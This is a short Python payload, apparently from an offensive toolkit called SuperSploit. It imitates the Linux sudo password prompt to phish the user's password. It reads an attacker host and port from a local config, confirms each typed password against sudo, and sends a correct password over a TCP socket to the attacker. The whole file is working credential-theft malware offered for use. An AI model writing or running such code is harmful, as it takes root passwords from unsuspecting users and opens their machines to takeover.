# integrated = True
#!#!#!
# This is a payload that mimics the sudo password prompt
# in linux,
# but instead sends the password back to the attacker
# REQUIRED OPTIONS
# L_HOST: Receiving host
# L_PORT: Receiving port
#!#!#!

import getpass
import json
import os
from socket import socket, AF_INET, SOCK_STREAM

from subprocess import Popen, PIPE
installation = f'{os.getenv("HOME")}/.SuperSploit'
with open(f"{installation}/.data/data.json", 'r') as file:
    di = json.load(file)
    file.close()

ip = di["L_HOST"]
port = int(di["L_PORT"])

class sudo:

    def __init__(self):
        pass

    @classmethod
    def prompt(cls):
        a = socket(AF_INET, SOCK_STREAM)
        a.connect((ip, port))
        for x in range(3):
            passwd = getpass.getpass(f'[sudo] password for {getpass.getuser()}: ')
            cmd = Popen(['sudo', '-S', 'whoami'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
            cmd.communicate(passwd.encode())
            if 'root' in cmd.communicate()[0].decode():
                a.send(passwd.encode())
                return True
            else:
                print('Sorry, try again.')
                cmd.kill()
        print("sudo: 3 incorrect password attempts")


sudo().prompt()
